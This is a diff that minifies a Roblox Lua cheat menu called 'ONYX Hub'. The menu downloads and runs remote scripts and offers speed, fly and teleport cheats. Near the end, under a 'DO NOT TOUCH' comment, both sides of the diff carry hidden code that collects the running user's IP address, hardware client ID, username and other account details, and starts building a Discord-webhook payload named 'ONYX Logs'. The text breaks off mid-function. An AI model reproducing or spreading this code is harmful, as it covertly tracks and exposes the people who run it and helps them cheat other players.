@@ -1,591 +1,590 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local a=loadstring(game:HttpGet'https://sirius.menu/rayfield')()
 
-local Window = Rayfield:CreateWindow({
-    Name = "ONYX Hub",
-    Icon = 0,
-    LoadingTitle = "Loading....",
-    LoadingSubtitle = "by CidKagenou",
-    Theme = "Amethyst",
- 
-    DisableRayfieldPrompts = false,
-    DisableBuildWarnings = false,
- 
-    ConfigurationSaving = {
-       Enabled = true,
-       FolderName = nil,
-       FileName = "Big Hub"
-    },
- 
-    Discord = {
-       Enabled = true,
-       Invite = "https://discord.gg/bcM99Hy6cH",
-       RememberJoins = true
-    },
- 
-    KeySystem = false,
-    KeySettings = {
-       Title = "Untitled",
-       Subtitle = "Key System",
-       Note = "No method of obtaining the key is provided",
-       FileName = "Key",
-       SaveKey = true,
-       GrabKeyFromSite = false,
-       Key = {"Hello"}
-    }
- })
- 
- Rayfield:Notify({
-    Title = "Successfully Executed",
-    Content = "Script Made By CidKagenou ",
-    Duration = 6.5,
-    Image = "laptop",
- })
+local b=a:CreateWindow{
+Name="ONYX Hub",
+Icon=0,
+LoadingTitle="Loading....",
+LoadingSubtitle="by CidKagenou",
+Theme="Amethyst",
 
- Rayfield:Notify({
-    Title = "Join The Discord!",
-    Content = "Link Copied To Clipboard",
-    Duration = 6.5,
-    Image = "laptop",
- })
+DisableRayfieldPrompts=false,
+DisableBuildWarnings=false,
 
- local Tab = Window:CreateTab("Main", "scroll")
- local Section = Tab:CreateSection("Basic Scripts")
+ConfigurationSaving={
+Enabled=true,
+FolderName=nil,
+FileName="Big Hub"
+},
 
-local Button = Tab:CreateButton({
-   Name = "Infinite Yield",
-   Callback = function(v)
-   v = loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
-   end,
-})
+Discord={
+Enabled=true,
+Invite="https://discord.gg/bcM99Hy6cH",
+RememberJoins=true
+},
 
-local Section = Tab:CreateSection("MicUp Scripts")
+KeySystem=false,
+KeySettings={
+Title="Untitled",
+Subtitle="Key System",
+Note="No method of obtaining the key is provided",
+FileName="Key",
+SaveKey=true,
+GrabKeyFromSite=false,
+Key={"Hello"}
+}
+}
 
-local Button = Tab:CreateButton({
-    Name = "System Broken",
-    Callback = function(b)
-    b = loadstring(game:HttpGet('https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script'))()
-    end,
- })
+a:Notify{
+Title="Successfully Executed",
+Content="Script Made By CidKagenou ",
+Duration=6.5,
+Image="laptop",
+}
 
- local Button = Tab:CreateButton({
-    Name = "Orca",
-    Callback = function(c)
-    c = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua"))() mouse = game.Players.LocalPlayer:GetMouse()
-    end,
- })
+a:Notify{
+Title="Join The Discord!",
+Content="Link Copied To Clipboard",
+Duration=6.5,
+Image="laptop",
+}
 
- local Button = Tab:CreateButton({
-    Name = "Red Floor",
-    Callback = function(q)
-    q = loadstring(game:HttpGet("https://raw.githubusercontent.com/ONYX-codes/floorredscript/refs/heads/main/main.lua"))()
-    end,
- })
+local c=b:CreateTab("Main","scroll")
+c:CreateSection"Basic Scripts"
 
- local Tab = Window:CreateTab("Player", "layers")
- local Section = Tab:CreateSection("Settings")
+c:CreateButton{
+Name="Infinite Yield",
+Callback=function(d)
+d=loadstring(game:HttpGet"https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source")()
+end,
+}
 
- local Slider = Tab:CreateSlider({
-    Name = "Walkspeed",
-    Range = {16, 100},
-    Increment = 1,
-    Suffix = "Speed",
-    CurrentValue = 16,
-    Flag = "Slider1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
-    Callback = function(Value)
-        local player = game.Players.LocalPlayer
-        local character = player.Character
-        local humanoid = character and character:FindFirstChild("Humanoid")
-        
-        if humanoid then
-            humanoid.WalkSpeed = Value -- Set the walkspeed to the slider's value
-        end
-    end,
- })
+c:CreateSection"MicUp Scripts"
 
- local Slider = Tab:CreateSlider({
-    Name = "Jump Power",
-    Range = {50, 1000}, -- Range from 0 to 150
-    Increment = 1, -- Increases/decreases by 5
-    Suffix = "Power", -- Displays "Power" after the number
-    CurrentValue = 50, -- Default jump power
-    Flag = "Slider2", -- Unique identifier
-    Callback = function(Value)
-        -- Function to set jump power/height
-        local function updateJump(humanoid)
-            if humanoid then
-                -- Try both JumpHeight (newer) and JumpPower (older) for compatibility
-                pcall(function() humanoid.JumpHeight = Value / 10 end) -- JumpHeight scales differently
-                pcall(function() humanoid.JumpPower = Value end) -- Fallback for older systems
-            end
-        end
+c:CreateButton{
+Name="System Broken",
+Callback=function(d)
+d=loadstring(game:HttpGet'https://raw.githubusercontent.com/H20CalibreYT/SystemBroken/main/script')()
+end,
+}
 
-        -- Apply to current character
-        local player = game.Players.LocalPlayer
-        local character = player.Character
-        local humanoid = character and character:FindFirstChild("Humanoid")
-        updateJump(humanoid)
+c:CreateButton{
+Name="Orca",
+Callback=function(d)
+d=loadstring(game:HttpGetAsync"https://raw.githubusercontent.com/richie0866/orca/master/public/snapshot.lua")()mouse=game.Players.LocalPlayer:GetMouse()
+end,
+}
 
-        -- Reapply on character respawn
-        player.CharacterAdded:Connect(function(newCharacter)
-            local newHumanoid = newCharacter:WaitForChild("Humanoid")
-            updateJump(newHumanoid)
-        end)
-    end,
-})
+c:CreateButton{
+Name="Red Floor",
+Callback=function(d)
+d=loadstring(game:HttpGet"https://raw.githubusercontent.com/ONYX-codes/floorredscript/refs/heads/main/main.lua")()
+end,
+}
 
+local d=b:CreateTab("Player","layers")
+d:CreateSection"Settings"
 
--- Shared fly speed variable
-local flySpeed = 50 -- Default fly speed
-local isFlying = false -- Track flying state
+d:CreateSlider{
+Name="Walkspeed",
+Range={16,100},
+Increment=1,
+Suffix="Speed",
+CurrentValue=16,
+Flag="Slider1",
+Callback=function(e)
+local f=game.Players.LocalPlayer
+local g=f.Character
+local h=g and g:FindFirstChild"Humanoid"
 
--- Function to handle flying logic
-local function setFlyingState(enabled)
-    local player = game.Players.LocalPlayer
-    local character = player.Character
-    local humanoid = character and character:FindFirstChild("Humanoid")
-    local rootPart = character and character:FindFirstChild("HumanoidRootPart")
+if h then
+h.WalkSpeed=e
+end
+end,
+}
 
-    if humanoid and rootPart then
-        if enabled then -- Enable flying
-            local existingVelocity = rootPart:FindFirstChild("FlyVelocity")
-            local existingGyro = rootPart:FindFirstChild("FlyGyro")
-            if existingVelocity then existingVelocity:Destroy() end
-            if existingGyro then existingGyro:Destroy() end
+d:CreateSlider{
+Name="Jump Power",
+Range={50,1000},
+Increment=1,
+Suffix="Power",
+CurrentValue=50,
+Flag="Slider2",
+Callback=function(e)
 
-            local bodyVelocity = Instance.new("BodyVelocity")
-            bodyVelocity.Name = "FlyVelocity"
-            bodyVelocity.Velocity = Vector3.new(0, 0, 0)
-            bodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
-            bodyVelocity.Parent = rootPart
+local function updateJump(f)
+if f then
 
-            local bodyGyro = Instance.new("BodyGyro")
-            bodyGyro.Name = "FlyGyro"
-            bodyGyro.MaxTorque = Vector3.new(10000, 10000, 10000)
-            bodyGyro.P = 1500
-            bodyGyro.D = 300
-            bodyGyro.Parent = rootPart
-
-            humanoid.PlatformStand = true
-
-            local runService = game:GetService("RunService")
-            local connection
-            connection = runService.RenderStepped:Connect(function(deltaTime)
-                if not character or not rootPart or not bodyVelocity or not bodyGyro then
-                    connection:Disconnect()
-                    return
-                end
-
-                local camera = workspace.CurrentCamera
-                local moveDirection = Vector3.new()
-                local control = game.UserInputService
-
-                if control:IsKeyDown(Enum.KeyCode.W) then
-                    moveDirection = moveDirection + camera.CFrame.LookVector
-                end
-                if control:IsKeyDown(Enum.KeyCode.S) then
-                    moveDirection = moveDirection - camera.CFrame.LookVector
-                end
-                if control:IsKeyDown(Enum.KeyCode.A) then
-                    moveDirection = moveDirection - camera.CFrame.RightVector
-                end
-                if control:IsKeyDown(Enum.KeyCode.D) then
-                    moveDirection = moveDirection + camera.CFrame.RightVector
-                end
-                if control:IsKeyDown(Enum.KeyCode.Space) then
-                    moveDirection = moveDirection + Vector3.new(0, 1, 0)
-                end
-                if control:IsKeyDown(Enum.KeyCode.LeftShift) then
-                    moveDirection = moveDirection - Vector3.new(0, 1, 0)
-                end
-
-                local normalizedDirection = moveDirection.Magnitude > 0 and moveDirection.Unit or Vector3.new(0, 0, 0)
-                bodyVelocity.Velocity = normalizedDirection * flySpeed * deltaTime * 60
-                bodyGyro.CFrame = camera.CFrame
-            end)
-        else -- Disable flying
-            local bodyVelocity = rootPart:FindFirstChild("FlyVelocity")
-            local bodyGyro = rootPart:FindFirstChild("FlyGyro")
-            if bodyVelocity then bodyVelocity:Destroy() end
-            if bodyGyro then bodyGyro:Destroy() end
-            humanoid.PlatformStand = false
-        end
-        isFlying = enabled -- Update state
-    end
+pcall(function()f.JumpHeight=e/10 end)
+pcall(function()f.JumpPower=e end)
+end
 end
 
--- Fly Toggle (UI)
-local Toggle = Tab:CreateToggle({
-    Name = "Fly Toggle",
-    CurrentValue = false,
-    Flag = "Toggle1",
-    Callback = function(Value)
-        setFlyingState(Value) -- Use shared function
-    end,
-})
 
--- Fly Speed Slider
-local Slider = Tab:CreateSlider({
-    Name = "Fly Speed",
-    Range = {0, 500},
-    Increment = 10,
-    Suffix = "Speed",
-    CurrentValue = 50,
-    Flag = "Slider1",
-    Callback = function(Value)
-        flySpeed = Value -- Update fly speed
-    end,
-})
+local f=game.Players.LocalPlayer
+local g=f.Character
+local h=g and g:FindFirstChild"Humanoid"
+updateJump(h)
 
--- Keybind for toggling fly (e.g., "F" key)
-local UserInputService = game:GetService("UserInputService")
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end -- Ignore if input is processed (e.g., typing in chat)
-    if input.KeyCode == Enum.KeyCode.v then -- Change "F" to any key you want
-        local newState = not isFlying -- Toggle the state
-        setFlyingState(newState)
-        Toggle:Set(newState) -- Sync the UI toggle with the keybind
-    end
+
+f.CharacterAdded:Connect(function(i)
+local j=i:WaitForChild"Humanoid"
+updateJump(j)
+end)
+end,
+}
+
+
+
+local e=50
+local f=false
+
+
+local function setFlyingState(g)
+local h=game.Players.LocalPlayer
+local i=h.Character
+local j=i and i:FindFirstChild"Humanoid"
+local k=i and i:FindFirstChild"HumanoidRootPart"
+
+if j and k then
+if g then
+local l=k:FindFirstChild"FlyVelocity"
+local m=k:FindFirstChild"FlyGyro"
+if l then l:Destroy()end
+if m then m:Destroy()end
+
+local n=Instance.new"BodyVelocity"
+n.Name="FlyVelocity"
+n.Velocity=Vector3.new(0,0,0)
+n.MaxForce=Vector3.new(10000,10000,10000)
+n.Parent=k
+
+local o=Instance.new"BodyGyro"
+o.Name="FlyGyro"
+o.MaxTorque=Vector3.new(10000,10000,10000)
+o.P=1500
+o.D=300
+o.Parent=k
+
+j.PlatformStand=true
+
+local p=game:GetService"RunService"
+local q
+q=p.RenderStepped:Connect(function(r)
+if not i or not k or not n or not o then
+q:Disconnect()
+return
+end
+
+local s=workspace.CurrentCamera
+local t=Vector3.new()
+local u=game.UserInputService
+
+if u:IsKeyDown(Enum.KeyCode.W)then
+t=t+s.CFrame.LookVector
+end
+if u:IsKeyDown(Enum.KeyCode.S)then
+t=t-s.CFrame.LookVector
+end
+if u:IsKeyDown(Enum.KeyCode.A)then
+t=t-s.CFrame.RightVector
+end
+if u:IsKeyDown(Enum.KeyCode.D)then
+t=t+s.CFrame.RightVector
+end
+if u:IsKeyDown(Enum.KeyCode.Space)then
+t=t+Vector3.new(0,1,0)
+end
+if u:IsKeyDown(Enum.KeyCode.LeftShift)then
+t=t-Vector3.new(0,1,0)
+end
+
+local v=t.Magnitude>0 and t.Unit or Vector3.new(0,0,0)
+n.Velocity=v*e*r*60
+o.CFrame=s.CFrame
+end)
+else
+local l=k:FindFirstChild"FlyVelocity"
+local m=k:FindFirstChild"FlyGyro"
+if l then l:Destroy()end
+if m then m:Destroy()end
+j.PlatformStand=false
+end
+f=g
+end
+end
+
+
+local g=d:CreateToggle{
+Name="Fly Toggle",
+CurrentValue=false,
+Flag="Toggle1",
+Callback=function(g)
+setFlyingState(g)
+end,
+}
+
+
+d:CreateSlider{
+Name="Fly Speed",
+Range={0,500},
+Increment=10,
+Suffix="Speed",
+CurrentValue=50,
+Flag="Slider1",
+Callback=function(h)
+e=h
+end,
+}
+
+
+local h=game:GetService"UserInputService"
+h.InputBegan:Connect(function(i,j)
+if j then return end
+if i.KeyCode==Enum.KeyCode.v then
+local k=not f
+setFlyingState(k)
+g:Set(k)
+end
 end)
 
-local Section = Tab:CreateSection("VoiceChat")
-local Button = Tab:CreateButton({
-    Name = "UnBan VoiceChat",
-    Callback = function()
-    game:GetService("VoiceChatService"):joinVoice()
-    end,
- })
- 
- local Button = Tab:CreateButton({
-    Name = "TPTool",
-    Callback = function()
-        mouse = game.Players.LocalPlayer:GetMouse()
-        tool = Instance.new("Tool")
-        tool.RequiresHandle = false
-        tool.Name = "Equip to Click TP"
-        tool.Activated:connect(function()
-        local pos = mouse.Hit+Vector3.new(0,2.5,0)
-        pos = CFrame.new(pos.X,pos.Y,pos.Z)
-        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
-        end)
-        tool.Parent = game.Players.LocalPlayer.Backpack
-    end,
- })
- 
+d:CreateSection"VoiceChat"
+d:CreateButton{
+Name="UnBan VoiceChat",
+Callback=function()
+game:GetService"VoiceChatService":joinVoice()
+end,
+}
+
+d:CreateButton{
+Name="TPTool",
+Callback=function()
+mouse=game.Players.LocalPlayer:GetMouse()
+tool=Instance.new"Tool"
+tool.RequiresHandle=false
+tool.Name="Equip to Click TP"
+tool.Activated:connect(function()
+local i=mouse.Hit+Vector3.new(0,2.5,0)
+i=CFrame.new(i.X,i.Y,i.Z)
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame=i
+end)
+tool.Parent=game.Players.LocalPlayer.Backpack
+end,
+}
 
 
---Tags
-local Players = game:GetService("Players")
-local TweenService = game:GetService("TweenService")
-local RunService = game:GetService("RunService")
-local LocalPlayer = Players.LocalPlayer
 
--- Configuration for distance scaling and hiding
-local maxDistance = 150 -- Distance at which tags are smallest scale
-local minScale = 0.1  -- Minimum scale factor for tags
-local hideDistance = 150 -- Distance at which tags become completely invisible
 
--- Replace with your actual Roblox User ID
-local OWNER_USER_ID = 1004816978
+local i=game:GetService"Players"
+local j=game:GetService"TweenService"
+local k=game:GetService"RunService"
+local l=i.LocalPlayer
 
--- Function to calculate distance between local player and target player
-local function calculateDistance(character)
-    if not LocalPlayer.Character or not LocalPlayer.Character:FindFirstChild("HumanoidRootPart") or not character or not character:FindFirstChild("HumanoidRootPart") then
-        return math.huge -- Return a large distance if root parts are missing
-    end
-    local localRootPart = LocalPlayer.Character.HumanoidRootPart
-    local targetRootPart = character.HumanoidRootPart
-    return (targetRootPart.Position - localRootPart.Position).Magnitude
+
+local m=150
+local n=0.1
+local o=150
+
+
+local p=1004816978
+
+
+local function calculateDistance(q)
+if not l.Character or not l.Character:FindFirstChild"HumanoidRootPart"or not q or not q:FindFirstChild"HumanoidRootPart"then
+return math.huge
+end
+local r=l.Character.HumanoidRootPart
+local s=q.HumanoidRootPart
+return(s.Position-r.Position).Magnitude
 end
 
--- Function to get scale factor based on distance
-local function getScaleFactor(distance)
-    if distance > maxDistance then
-        return minScale
-    elseif distance <= 0 then
-        return 1
-    else
-        return 1 - (distance / maxDistance) * (1 - minScale)
-    end
+
+local function getScaleFactor(q)
+if q>m then
+return n
+elseif q<=0 then
+return 1
+else
+return 1-(q/m)*(1-n)
+end
 end
 
--- Function to create a clickable tag with teleport
-local function createTag(character, tagText, color)
-    local head = character:WaitForChild("Head", 5)
-    if not head then return end
 
-    if head:FindFirstChild("PlayerTag") then
-        head.PlayerTag:Destroy()
-    end
+local function createTag(q,r,s)
+local t=q:WaitForChild("Head",5)
+if not t then return end
 
-    -- Create BillboardGui
-    local billboard = Instance.new("BillboardGui")
-    billboard.Name = "PlayerTag"
-    billboard.Adornee = head
-    billboard.Size = UDim2.new(0, 120, 0, 50) -- Initial size, will be scaled
-    billboard.StudsOffset = Vector3.new(0, 3, 0)
-    billboard.AlwaysOnTop = true
-    billboard.Parent = head
-
-    -- Gray background frame with rounded corners
-    local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 10, 1, 10)
-    frame.Position = UDim2.new(0, -5, 0, -5)
-    frame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-    frame.BorderSizePixel = 0
-    frame.Parent = billboard
-
-    local corner = Instance.new("UICorner")
-    corner.CornerRadius = UDim.new(0, 12)
-    corner.Parent = frame
-
-    -- UIStroke for thin rainbow border
-    local stroke = Instance.new("UIStroke")
-    stroke.Thickness = 2
-    stroke.Color = Color3.fromRGB(255, 255, 255)
-    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
-    stroke.Parent = frame
-
-    local gradient = Instance.new("UIGradient")
-    gradient.Color = ColorSequence.new({
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
-        ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 255, 0)),
-        ColorSequenceKeypoint.new(0.4, Color3.fromRGB(0, 255, 0)),
-        ColorSequenceKeypoint.new(0.6, Color3.fromRGB(0, 255, 255)),
-        ColorSequenceKeypoint.new(0.8, Color3.fromRGB(0, 0, 255)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 0, 255))
-    })
-    gradient.Rotation = 0
-    gradient.Parent = stroke
-
-    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1)
-    local tween = TweenService:Create(gradient, tweenInfo, {Rotation = 360})
-    tween:Play()
-
-    -- TextLabel for tag
-    local label = Instance.new("TextLabel")
-    label.Size = UDim2.new(1, 0, 1, 0)
-    label.BackgroundTransparency = 1
-    label.TextScaled = true
-    label.Font = Enum.Font.GothamBold
-    label.TextColor3 = color
-    label.TextStrokeTransparency = 0.5
-    label.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
-    label.Text = tagText == "Owner" and "👑 Owner" or "🌟 Member"
-    label.ZIndex = 2 -- Above button
-    label.Parent = billboard
-
-    -- Clickable TextButton for teleport
-    local button = Instance.new("TextButton")
-    button.Size = UDim2.new(1, 10, 1, 10)
-    button.Position = UDim2.new(0, -5, 0, -5)
-    button.BackgroundTransparency = 1 -- Invisible
-    button.Text = "" -- No text, just for clicking
-    button.ZIndex = 1 -- Below label
-    button.Parent = billboard
-
-    -- Teleport on click
-    button.MouseButton1Click:Connect(function()
-        local targetPlayer = Players:GetPlayerFromCharacter(character)
-        if targetPlayer and targetPlayer.Character then
-            local targetRoot = targetPlayer.Character:FindFirstChild("HumanoidRootPart")
-            local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
-            if targetRoot and myRoot then
-                myRoot.CFrame = targetRoot.CFrame -- Teleport to their position
-            end
-        end
-    end)
-
-    return billboard -- Return the billboard to update size later
+if t:FindFirstChild"PlayerTag"then
+t.PlayerTag:Destroy()
 end
 
-local tagBillboards = {} -- Store billboards for size updates
 
--- Function to update tag sizes and visibility
+local u=Instance.new"BillboardGui"
+u.Name="PlayerTag"
+u.Adornee=t
+u.Size=UDim2.new(0,120,0,50)
+u.StudsOffset=Vector3.new(0,3,0)
+u.AlwaysOnTop=true
+u.Parent=t
+
+
+local v=Instance.new"Frame"
+v.Size=UDim2.new(1,10,1,10)
+v.Position=UDim2.new(0,-5,0,-5)
+v.BackgroundColor3=Color3.fromRGB(50,50,50)
+v.BorderSizePixel=0
+v.Parent=u
+
+local w=Instance.new"UICorner"
+w.CornerRadius=UDim.new(0,12)
+w.Parent=v
+
+
+local x=Instance.new"UIStroke"
+x.Thickness=2
+x.Color=Color3.fromRGB(255,255,255)
+x.ApplyStrokeMode=Enum.ApplyStrokeMode.Border
+x.Parent=v
+
+local y=Instance.new"UIGradient"
+y.Color=ColorSequence.new{
+ColorSequenceKeypoint.new(0,Color3.fromRGB(255,0,0)),
+ColorSequenceKeypoint.new(0.2,Color3.fromRGB(255,255,0)),
+ColorSequenceKeypoint.new(0.4,Color3.fromRGB(0,255,0)),
+ColorSequenceKeypoint.new(0.6,Color3.fromRGB(0,255,255)),
+ColorSequenceKeypoint.new(0.8,Color3.fromRGB(0,0,255)),
+ColorSequenceKeypoint.new(1,Color3.fromRGB(255,0,255))
+}
+y.Rotation=0
+y.Parent=x
+
+local z=TweenInfo.new(2,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,-1)
+local A=j:Create(y,z,{Rotation=360})
+A:Play()
+
+
+local B=Instance.new"TextLabel"
+B.Size=UDim2.new(1,0,1,0)
+B.BackgroundTransparency=1
+B.TextScaled=true
+B.Font=Enum.Font.GothamBold
+B.TextColor3=s
+B.TextStrokeTransparency=0.5
+B.TextStrokeColor3=Color3.fromRGB(0,0,0)
+B.Text=r=="Owner"and"👑 Owner"or"🌟 Member"
+B.ZIndex=2
+B.Parent=u
+
+
+local C=Instance.new"TextButton"
+C.Size=UDim2.new(1,10,1,10)
+C.Position=UDim2.new(0,-5,0,-5)
+C.BackgroundTransparency=1
+C.Text=""
+C.ZIndex=1
+C.Parent=u
+
+
+C.MouseButton1Click:Connect(function()
+local D=i:GetPlayerFromCharacter(q)
+if D and D.Character then
+local E=D.Character:FindFirstChild"HumanoidRootPart"
+local F=l.Character and l.Character:FindFirstChild"HumanoidRootPart"
+if E and F then
+F.CFrame=E.CFrame
+end
+end
+end)
+
+return u
+end
+
+local q={}
+
+
 local function updateTagSizes()
-    for player, billboard in pairs(tagBillboards) do
-        if player and player.Character and billboard and billboard.Parent ~= nil then
-            local distance = calculateDistance(player.Character)
-            local scaleFactor = getScaleFactor(distance)
+for r,s in pairs(q)do
+if r and r.Character and s and s.Parent~=nil then
+local t=calculateDistance(r.Character)
+local u=getScaleFactor(t)
 
-            billboard.Size = UDim2.new(0, 120 * scaleFactor, 0, 50 * scaleFactor) -- Scale size based on distance
+s.Size=UDim2.new(0,120*u,0,50*u)
 
-            if distance > hideDistance then
-                billboard.Enabled = false -- Hide tag beyond hideDistance
-            else
-                billboard.Enabled = true -- Show tag within hideDistance
-            end
-        else
-            tagBillboards[player] = nil -- Clean up invalid entries
-        end
-    end
+if t>o then
+s.Enabled=false
+else
+s.Enabled=true
+end
+else
+q[r]=nil
+end
+end
 end
 
--- Function to start updating tag sizes
-local updatingTagsConnection = nil
+
+local r
 local function startTagSizeUpdates()
-    if not updatingTagsConnection then
-        updatingTagsConnection = RunService.RenderStepped:Connect(updateTagSizes)
-    end
+if not r then
+r=k.RenderStepped:Connect(updateTagSizes)
+end
 end
 
--- Function to stop updating tag sizes
+
 local function stopTagSizeUpdates()
-    if updatingTagsConnection then
-        updatingTagsConnection:Disconnect()
-        updatingTagsConnection = nil
-    end
+if r then
+r:Disconnect()
+r=nil
+end
 end
 
--- Function to apply/remove tags
-local function applyTags(enabled)
-    tagBillboards = {} -- Clear existing billboards
-    if enabled then
-        for _, player in pairs(Players:GetPlayers()) do
-            if player.Character then
-                local tagBillboard
-                if player.UserId == OWNER_USER_ID then
-                    tagBillboard = createTag(player.Character, "Owner", Color3.fromRGB(255, 215, 0))
-                else
-                    tagBillboard = createTag(player.Character, "Member", Color3.fromRGB(0, 170, 255))
-                end
-                if tagBillboard then
-                    tagBillboards[player] = tagBillboard -- Store the billboard
-                end
-            end
-        end
-        startTagSizeUpdates() -- Start updating tag sizes
-    else
-        for _, player in pairs(Players:GetPlayers()) do
-            if player.Character and player.Character:FindFirstChild("Head") then
-                local tag = player.Character.Head:FindFirstChild("PlayerTag")
-                if tag then tag:Destroy() end
-            end
-        end
-        stopTagSizeUpdates() -- Stop updating tag sizes
-        tagBillboards = {} -- Clear stored billboards
-    end
+
+local function applyTags(s)
+q={}
+if s then
+for t,u in pairs(i:GetPlayers())do
+if u.Character then
+local v
+if u.UserId==p then
+v=createTag(u.Character,"Owner",Color3.fromRGB(255,215,0))
+else
+v=createTag(u.Character,"Member",Color3.fromRGB(0,170,255))
+end
+if v then
+q[u]=v
+end
+end
+end
+startTagSizeUpdates()
+else
+for t,u in pairs(i:GetPlayers())do
+if u.Character and u.Character:FindFirstChild"Head"then
+local v=u.Character.Head:FindFirstChild"PlayerTag"
+if v then v:Destroy()end
+end
+end
+stopTagSizeUpdates()
+q={}
+end
 end
 
--- Enable tags by default
+
 applyTags(true)
 
--- Handle new players and respawns
-Players.PlayerAdded:Connect(function(player)
-    player.CharacterAdded:Connect(function(character)
-        if tagBillboards[player] == nil then
-            local tagBillboard
-            if player.UserId == OWNER_USER_ID then
-                tagBillboard = createTag(character, "Owner", Color3.fromRGB(255, 215, 0))
-            else
-                tagBillboard = createTag(character, "Member", Color3.fromRGB(0, 170, 255))
-            end
-            tagBillboards[player] = tagBillboard
-        end
-    end)
+
+i.PlayerAdded:Connect(function(s)
+s.CharacterAdded:Connect(function(t)
+if q[s]==nil then
+local u
+if s.UserId==p then
+u=createTag(t,"Owner",Color3.fromRGB(255,215,0))
+else
+u=createTag(t,"Member",Color3.fromRGB(0,170,255))
+end
+q[s]=u
+end
+end)
 end)
 
-LocalPlayer.CharacterAdded:Connect(function(character)
-    if tagBillboards[LocalPlayer] == nil then
-        local tagBillboard
-        if LocalPlayer.UserId == OWNER_USER_ID then
-            tagBillboard = createTag(character, "Owner", Color3.fromRGB(255, 215, 0))
-        else
-            tagBillboard = createTag(character, "Member", Color3.fromRGB(0, 170, 255))
-        end
-        tagBillboards[LocalPlayer] = tagBillboard
-    end
+l.CharacterAdded:Connect(function(s)
+if q[l]==nil then
+local t
+if l.UserId==p then
+t=createTag(s,"Owner",Color3.fromRGB(255,215,0))
+else
+t=createTag(s,"Member",Color3.fromRGB(0,170,255))
+end
+q[l]=t
+end
 end)
 
---[[
-	WARNING: DO NOT TOUCH!!!
-]]
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local MarketplaceService = game:GetService("MarketplaceService")
-local LocalizationService = game:GetService("LocalizationService")
-local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
-local GroupService = game:GetService("GroupService")
-local BadgeService = game:GetService("BadgeService")
-local UserInputService = game:GetService("UserInputService")
-local Stats = game:GetService("Stats")
 
-local LocalPlayer = Players.LocalPlayer
-local UserId = LocalPlayer.UserId
-local DisplayName = LocalPlayer.DisplayName
-local Username = LocalPlayer.Name
-local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
-local AccountAge = LocalPlayer.AccountAge
-local Country = LocalizationService.RobloxLocaleId
-local GetIp = game:HttpGet("https://v4.ident.me/")
-local GetData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
-local Hwid = RbxAnalyticsService:GetClientId()
-local GameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
-local GameName = GameInfo.Name
-local Platform = (UserInputService.TouchEnabled and not UserInputService.MouseEnabled) and "📱 Mobile" or "💻 PC"
-local Ping = math.round(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())
+
+
+local s=game:GetService"HttpService"
+local t=game:GetService"Players"
+local u=game:GetService"MarketplaceService"
+local v=game:GetService"LocalizationService"
+local w=game:GetService"RbxAnalyticsService"
+game:GetService"GroupService"
+game:GetService"BadgeService"
+local x=game:GetService"UserInputService"
+local y=game:GetService"Stats"
+
+local z=t.LocalPlayer
+local A=z.UserId
+local B=z.DisplayName
+local C=z.Name
+local D=tostring(z.MembershipType):sub(21)
+local E=z.AccountAge local F=
+v.RobloxLocaleId
+local G=game:HttpGet"https://v4.ident.me/"
+local H=s:JSONDecode(game:HttpGet"http://ip-api.com/json")
+local I=w:GetClientId()
+local J=u:GetProductInfo(game.PlaceId)
+local K=J.Name
+local L=(x.TouchEnabled and not x.MouseEnabled)and"📱 Mobile"or"💻 PC"
+local M=math.round(y.Network.ServerStatsItem["Data Ping"]:GetValue())
 
 local function detectExecutor()
-    return identifyexecutor()
+return identifyexecutor()
 end
 
 local function createWebhookData()
-    local executor = detectExecutor()
-    local date = os.date("%m/%d/%Y")
-    local time = os.date("%X")
-    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
-    local playerLink = "https://www.roblox.com/users/" .. UserId
-    local mobileJoinLink = "https://www.roblox.com/games/start?placeId=" .. game.PlaceId .. "&launchData=" .. game.JobId
-    local jobIdLink = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId
+local N=detectExecutor()
+local O=os.date"%m/%d/%Y"
+local P=os.date"%X"
+local Q="https://www.roblox.com/games/"..game.PlaceId
+local R="https://www.roblox.com/users/"..A
+local S="https://www.roblox.com/games/start?placeId="..game.PlaceId.."&launchData="..game.JobId
+local T="https://www.roblox.com/games/"..game.PlaceId.."?jobId="..game.JobId
 
-    local data = {
-        username = "ONYX Logs",
-        avatar_url = "https://i.imgur.com/AfFp7pu.png",
-        embeds = {
-            {
-                title = "🎮 Game Information",
-                description = string.format("**[%s](%s)**\n`ID: %d`", GameName, gameLink, game.PlaceId),
-                color = tonumber("0x2ecc71")
-            },
-            {
-                title = "👤 Player Information",
-                description = string.format(
-                    "**Display Name:** [%s](%s)\n**Username:** %s\n**User ID:** %d\n**Membership:** %s\n**Account Age:** %d days\n**Platform:** %s\n**Ping:** %dms",
-                    DisplayName, playerLink, Username, UserId, MembershipType, AccountAge, Platform, Ping
-                ),
-                color = MembershipType == "Premium" and tonumber("0xf1c40f") or tonumber("0x3498db")
-            },
-            {
-                title = "🌐 Location & Network",
-                description = string.format(
